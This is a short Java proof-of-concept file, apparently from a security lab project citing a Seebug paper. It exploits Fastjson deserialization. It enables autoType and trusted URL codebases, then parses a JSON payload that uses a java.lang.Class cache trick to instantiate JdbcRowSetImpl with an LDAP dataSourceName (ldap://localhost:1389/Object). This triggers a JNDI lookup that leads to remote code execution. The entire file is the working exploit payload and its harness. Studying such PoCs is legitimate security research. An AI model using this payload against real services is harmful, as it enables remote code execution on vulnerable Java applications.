package com.example.fastjson220523poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * https://paper.seebug.org/1192/#ver1268
 */
public class JNDI1247 {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        String payload = "{\n" +
                "    \"rand1\": {\n" +
                "        \"@type\": \"java.lang.Class\", \n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    }, \n" +
                "    \"rand2\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
                "        \"dataSourceName\": \"ldap://localhost:1389/Object\", \n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload);
    }
}
